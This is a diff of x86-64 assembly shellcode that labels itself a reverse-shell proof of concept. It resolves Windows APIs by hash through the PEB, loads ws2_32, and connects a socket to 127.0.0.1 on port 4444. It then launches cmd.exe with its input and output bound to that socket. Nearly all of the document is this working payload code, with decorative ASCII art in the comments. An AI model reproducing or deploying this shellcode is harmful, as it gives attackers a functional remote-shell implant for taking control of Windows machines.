@@ -1,82 +1,43 @@
 BITS 64
 
-        CLD
-        AND     RSP,    0xFFFFFFFFFFFFFFF0
-        MOV     RAX,    0x7369746E656C6973
-        PUSH    RAX
+; Reverse Shell with Indirect Funcalls
+;
+; This proof-of-concept represents the minimum
+; required to establish a reverse shell. This
+; code includes dynamically resolving functions
+; and calling them indirectly. This is just the
+; start to what is possible with only shellcode.
+;
+;                       ``
+;                     .001.^
+;                     u$ON=1
+;                     z00BAI
+;                    I..=~.
+;                   ;s<’’’
+;                   NRX~=-`
+;                   z0c^<X^
+;                   ~B0s~^`
+;                    @@$H~’
+;                   n$0=XN;,`
+;                  iBBB0vU1=~’`
+;                  `$@00cRr`vui
+;                   FAHZuqr-’
+;                   ZZUFA@Fi.`
+;                  ;BRHv n$U^-
+;                `ARN1   ^@si
+;                ‘Onv~     01.’
+;                cOqr      rs.`
+;                aUU`       uI`
+;               `RO-         :.`
+;               nn~`         -=.~I-`
+;               =1^’..`      `..`
 
-GET_KERNEL32:
-        MOV     RAX,    GS:[0x60]
-        MOV     RAX,    [RAX + 0x18]
-        MOV     RAX,    [RAX + 0x30]
-        MOV     RAX,    [RAX]
-        MOV     RAX,    [RAX]
-        MOV     RAX,    [RAX + 0x10]
-        PUSH    RAX
+        CALL    INIT_SHELLCODE
 
-        SUB     RSP,    0x40
+        SUB     RSP,    0x50
         MOV     RBP,    RSP
-        
-GET_CREATEPROCESSA:
-        MOV     RCX,    QWORD   [RBP + 0x40]
-        MOV     RDX,    0x6BA6BCC9
-        CALL    FIND_FUNCTION
-        
-        MOV     QWORD   [RBP + 0x28],   RAX
 
-GET_EXITPROCESS:
-        MOV     RCX,    QWORD   [RBP + 0x40]
-        MOV     RDX,    0x4FD18963
-        CALL    FIND_FUNCTION
-        
-        MOV     QWORD   [RBP + 0x20],   RAX
-
-GET_LOADLIBRARYA:
-        MOV     RCX,    QWORD   [RBP + 0x40]
-        MOV     RDX,    0xC917432
-        CALL    FIND_FUNCTION
-        
-        MOV     QWORD   [RBP + 0x18],   RAX
-
-LOAD_WS232:
-        CALL    CLEAN
-
-        PUSH    0x006C6C
-        MOV     RAX,    0x642E32335F327377
-        PUSH    RAX
-        MOV     RCX,    RSP
-        PUSH    0x00
-        PUSH    0x00
-        PUSH    0x00
-        PUSH    0x00
-
-        MOV     R10,    QWORD   [RBP + 0x18]
-        CALL    SET_FUNCTION
-        CALL    RUN_FUNCTION
-
-        ADD     RSP,    0x30
-        MOV     QWORD   [RBP + 0x38],   RAX
-        
-GET_WSASTARTUP:
-        MOV     RCX,    QWORD   [RBP + 0x38]
-        MOV     RDX,    0x80B46A3D
-        CALL    FIND_FUNCTION
-
-        MOV     QWORD   [RBP + 0x10],   RAX
-
-GET_WSASOCKETA:
-        MOV     RCX,    QWORD   [RBP + 0x38]
-        MOV     RDX,    0xDE78322D
-        CALL    FIND_FUNCTION
-        
-        MOV     QWORD   [RBP + 0x08],   RAX
-
-GET_CONNECT:
-        MOV     RCX,    QWORD   [RBP + 0x38]
-        MOV     RDX,    0xC0577762
-        CALL    FIND_FUNCTION
-        
-        MOV     QWORD   [RBP + 0x00],   RAX
+        CALL    INIT_KERNEL32_API
 
 ; Windows ABI follows a standard calling convention.
 ;
@@ -102,21 +63,18 @@ FUNCTIONS:
 ; is not required to be zeroed out.
 
 RUN_WSASTARTUP:
-        CALL    CLEAN
+        MOV     RCX,    QWORD   [RBP + 0x10]
+        CALL    SET_FUNCTION
 
         MOV     RCX,    0x0202
         SUB     RSP,    0x190
         MOV     RDX,    RSP
-        PUSH    0x00
-        PUSH    0x00
-        PUSH    0x00
-        PUSH    0x00
-        
-        MOV     R10,    QWORD   [RBP + 0x10]
-        CALL    SET_FUNCTION
+        SUB     RSP,    0x20
         CALL    RUN_FUNCTION
 
         ADD     RSP,    0x1B0
+        CMP     RAX,    0
+        JNZ     RUN_EXITPROCESS
 
 ; WSASocketA calls for 6 parameters.
 ; 
@@ -134,24 +92,23 @@ RUN_WSASTARTUP:
 ; socket opened by the OS.
 
 RUN_WSASOCKETA:
-        CALL    CLEAN
-
-        PUSH    0x00
-        PUSH    0x00
-        PUSH    0x00
-        PUSH    0x00
-        PUSH    0x00
-        PUSH    0x00
-        MOV     RCX,    0x02
-        MOV     RDX,    0x01
-        MOV     R8,     0x06
-        
-        MOV     R10,    QWORD   [RBP + 0x08]
+        MOV     RCX,    QWORD   [RBP + 0x08]
         CALL    SET_FUNCTION
+
+        MOV     RCX,    2
+        MOV     RDX,    1
+        MOV     R8,     6
+        XOR     R9,     R9
+        PUSH    0
+        PUSH    0
+        SUB     RSP,    0x20
         CALL    RUN_FUNCTION
 
         ADD     RSP,    0x30
-        PUSH    RAX
+        CMP     RAX,    0xFFFFFFFFFFFFFFFF
+        JZ      RUN_EXITPROCESS
+
+        MOV     QWORD   [RBP + 0x40],   RAX
 
 ; connect calls for 3 arguments.
 ;
@@ -165,25 +122,21 @@ RUN_WSASOCKETA:
 ; This structure also has 8 bytes of padding.
 
 RUN_CONNECT:
-        CALL    CLEAN
+        MOV     RCX,    QWORD   [RBP]
+        CALL    SET_FUNCTION
 
-        PUSH    0x00
-        PUSH    0x00
-        MOV     RCX,    0x0100007f5c110002
-        PUSH    RCX
-        MOV     RCX,    RAX
+        MOV     RCX,    QWORD   [RBP + 0x40]
+        PUSH    0
+        MOV     RAX,    0x0100007F5C110002
+        PUSH    RAX
         MOV     RDX,    RSP
         MOV     R8,     0x10
-        PUSH    0x00
-        PUSH    0x00
-        PUSH    0x00
-        PUSH    0x00
-        
-        MOV     R10,    QWORD   [RBP + 0x00]
-        CALL    SET_FUNCTION
+        SUB     RSP,    0x20
         CALL    RUN_FUNCTION
 
-        ADD     RSP,    0x38
+        ADD     RSP,    0x30
+        CMP     RAX,    0
+        JNZ     RUN_EXITPROCESS
 
 ; CreateProcessA calls for 10 arguments.
 ;
@@ -209,68 +162,179 @@ RUN_CONNECT:
 ; process and thread information. Is not required to
 
 RUN_CREATEPROCESSA:
-        CALL    CLEAN
-        
-        PUSH    0x00
+        MOV     RCX,    QWORD   [RBP + 0x20]
+        CALL    SET_FUNCTION
+
+        XOR     RCX,    RCX
+        PUSH    0
+        PUSH    0
         MOV     RAX,    0x006578652E646D63
         PUSH    RAX
         MOV     RDX,    RSP
-
-        ; Startup information structure
-
-        MOV     RAX,    QWORD   [RSP + 0x10]
+        XOR     R8,     R8
+        XOR     R9,     R9
+        MOV     RAX,    QWORD   [RBP + 0x40]
         PUSH    RAX
         PUSH    RAX
         PUSH    RAX
-        PUSH    0x00
-        PUSH    0x00
+        PUSH    0
+        PUSH    0
         MOV     RAX,    0x0000010000000000
         PUSH    RAX
-        PUSH    0x00
-        PUSH    0x00
-        PUSH    0x00
-        PUSH    0x00
-        PUSH    0x00
-        PUSH    0x00
+        PUSH    0
+        PUSH    0
+        PUSH    0
+        PUSH    0
+        PUSH    0
+        PUSH    0
         PUSH    0x68
-
-        ; Process information structure
-
-        PUSH    0x00
-        PUSH    0x00
-        PUSH    0x00
-        PUSH    0x00
+        PUSH    0
+        PUSH    0
+        PUSH    0
+        PUSH    0
         LEA     RAX,    QWORD   [RSP + 0x08]
-        PUSH    RAX             ; [RSP + 0x48] => 10th parameter
+        PUSH    RAX
         LEA     RAX,    QWORD   [RSP + 0x28]
-        PUSH    RAX             ; [RSP + 0x40] => 9th parameter
-        PUSH    0x00            ; [RSP + 0x38] => 8th parameter
-        PUSH    0x00            ; [RSP + 0x30] => 7th parameter
-        PUSH    0x08000000      ; [RSP + 0x28] => 6th parameter
-        PUSH    0x01            ; [RSP + 0x20] => 5th parameter
-        PUSH    0x00
-        PUSH    0x00
-        PUSH    0x00
-        PUSH    0x00
-        
-        MOV     R10,    QWORD   [RBP + 0x28]
-        CALL    SET_FUNCTION
+        PUSH    RAX
+        PUSH    0
+        PUSH    0
+        PUSH    0x08000000
+        PUSH    1
+        SUB     RSP,    0x20
         CALL    RUN_FUNCTION
 
         ADD     RSP,    0xF0
 
 RUN_EXITPROCESS:
-        CALL    CLEAN
-
-        MOV     R10,    QWORD   [RBP + 0x20]
+        MOV     RCX,    QWORD   [RBP + 0x28]
         CALL    SET_FUNCTION
+
+        XOR     RCX,    RCX
         CALL    RUN_FUNCTION
 
-; =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= ;
+;                       _._                 ;
+;                  t,. P$$b,                ;
+;                 _ k$4$I$$R                ;
+;                AP$$$$KA$$$SGb,            ;
+;                 K$$L`‘q’^$$Q$$}           ;
+;                ,d$$$$% $$P4$$’            ;
+;               ,$$P’^$$S$$’                ;
+;             d$$$$b. ‘K$$’                 ;
+;       7$$$$.$$$$$$’   *                   ;
+;       v$$$$~*’”$$$b,.                     ;
+;        d$$$k  ‘$sIS$$._                   ;
+;       “^’.$bdIb$$$$”`                     ;
+;          K$$FQ$$$,,                       ;
+;               “k$$$$$  .,nM$$,            ;
+;                 `P$$$Bb$$$SS$$;           ;
+;                 .,$$$hi:)PY$$$.           ;
+;              :$$u$$K`  `;$$$$$,,.         ;
+;              ;R$$$$P’, :;:P$$$$$$$.       ;
+;                 .7$$$m,x,.z$Iiu$$$I:      ;
+;               p$$$$$$$S$II$$$Iiu$$$.      ;
+;              ‘K**~$$II$$$’’S$$$$Z*’       ;
+;                  ‘$$$I$$$;                ;
+;                   S$$U$$I                 ;
+;                    K$$”’                  ;
+
+INIT_SHELLCODE:
+        CLD
+        MOV     RAX,    0x7369746E656C6973
+        MOV     RAX,    QWORD   [RSP]
+        AND     SPL,    0xF0
+        PUSH    RAX
+        RET
+
+GET_NTDLL:
+        MOV     RAX,    GS:[0x60]
+        MOV     RAX,    [RAX + 0x18]
+        MOV     RAX,    [RAX + 0x30]
+        MOV     RAX,    [RAX + 0x10]
+        RET
+
+GET_KERNEL32:
+        MOV     RAX,    GS:[0x60]
+        MOV     RAX,    [RAX + 0x18]
+        MOV     RAX,    [RAX + 0x30]
+        MOV     RAX,    [RAX]
+        MOV     RAX,    [RAX]
+        MOV     RAX,    [RAX + 0x10]
+        RET
+
+INIT_KERNEL32_API:
+;         CALL    GET_KERNEL32
+;         MOV     QWORD   [RBP + 0X50],   RAX
+;
+; GET_EXITPROCESS:
+;         MOV     RCX,    QWORD   [RBP + 0x50]
+;         MOV     RDX,    0x4FD18963
+;         LEA     R8,     QWORD   [RBP + 0x28]
+;         CALL    FIND_FUNCTION
+
+        CALL    GET_NTDLL
+        MOV     QWORD   [RBP + 0X50],   RAX
+
+GET_EXITTHREAD:
+        MOV     RCX,    QWORD   [RBP + 0x50]
+        MOV     RDX,    0x6DEC1356
+        LEA     R8,     QWORD   [RBP + 0x28]
+        CALL    FIND_FUNCTION
+
+        CALL    GET_KERNEL32
+        MOV     QWORD   [RBP + 0X50],   RAX
+
+GET_CREATEPROCESSA:
+        MOV     RCX,    QWORD   [RBP + 0x50]
+        MOV     RDX,    0x6BA6BCC9
+        LEA     R8,     QWORD   [RBP + 0x20]
+        CALL    FIND_FUNCTION
+
+GET_LOADLIBRARYA:
+        MOV     RCX,    QWORD   [RBP + 0x50]
+        MOV     RDX,    0xC917432
+        LEA     R8,     QWORD   [RBP + 0x18]
+        CALL    FIND_FUNCTION
+
+        MOV     RCX,    QWORD   [RBP + 0x18]
+        CALL    SET_FUNCTION
+
+LOAD_WS232:
+        PUSH    0
+        PUSH    0x6C6C
+        MOV     RAX,    0x642E32335F327377
+        PUSH    RAX
+        MOV     RCX,    RSP
+        SUB     RSP,    0x20
+
+        CALL    RUN_FUNCTION
+
+        ADD     RSP,    0x38
+        MOV     QWORD   [RBP + 0x48],   RAX
+
+GET_WSASTARTUP:
+        MOV     RCX,    QWORD   [RBP + 0x48]
+        MOV     RDX,    0x80B46A3D
+        LEA     R8,     QWORD   [RBP + 0x10]
+        CALL    FIND_FUNCTION
+
+GET_WSASOCKETA:
+        MOV     RCX,    QWORD   [RBP + 0x48]
+        MOV     RDX,    0xDE78322D
+        LEA     R8,     QWORD   [RBP + 0x08]
+        CALL    FIND_FUNCTION
+
+GET_CONNECT:
+        MOV     RCX,    QWORD   [RBP + 0x48]
+        MOV     RDX,    0xC0577762
+        LEA     R8,     QWORD   [RBP]
+        CALL    FIND_FUNCTION
+
+        RET
 
 FIND_FUNCTION:
 
 PARSE_MODULE:
+        PUSH    R8
         MOV     R8D,    DWORD   [RCX + 0x3C]
         LEA     R8,     QWORD   [RCX + R8]
         MOV     R8D,    DWORD   [R8 + 0x88]
@@ -306,20 +370,15 @@ RETURN_FUNCTION:
         LEA     RAX,    QWORD   [RCX + RAX]
         MOV     EAX,    DWORD   [RAX + RDX * 0x04]
         LEA     RAX,    QWORD   [RCX + RAX]
+        POP     R8
+        MOV     QWORD   [R8],   RAX
         RET
 
 SET_FUNCTION:
         XOR     RAX,    RAX
         MOV     QWORD   [RBP + 0x30],   RAX
-        MOV     QWORD   [RBP + 0x30],   R10
+        MOV     QWORD   [RBP + 0x30],   RCX
         RET
 
 RUN_FUNCTION:
         JMP     QWORD   [RBP + 0x30]
-
-CLEAN:
-        XOR     RCX,    RCX
-        XOR     RDX,    RDX
-        XOR     R8,     R8
-        XOR     R9,     R9
-        RET
